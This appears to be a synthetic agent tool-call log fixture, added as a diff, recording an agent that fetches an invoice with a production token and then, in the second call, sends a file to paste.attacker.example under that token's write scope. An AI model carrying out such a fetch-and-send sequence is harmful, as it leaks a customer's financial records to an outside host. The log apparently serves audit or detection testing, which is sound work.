@@ -1,0 +1,25 @@
+{
+  "document_type": "TOOL_CALL_LOG",
+  "agent_id": "AGT-000001",
+  "issuer": "Docfetch request log",
+  "as_of": "2026-09-10T12:00:00Z",
+  "session_id": "ses-4471",
+  "calls": [
+    {
+      "seq": 1,
+      "at": "2026-09-10T09:31:20Z",
+      "tool": "GET /fetch",
+      "status": "OK",
+      "authorization": "AUTHORIZED",
+      "summary": "fetched invoice INV-2291 for the ledgerline-prod token"
+    },
+    {
+      "seq": 2,
+      "at": "2026-09-10T09:33:10Z",
+      "tool": "POST /send",
+      "status": "OK",
+      "authorization": "AUTHORIZED",
+      "summary": "the ledgerline-prod token sent one file to paste.attacker.example; its scope allowed write"
+    }
+  ]
+}
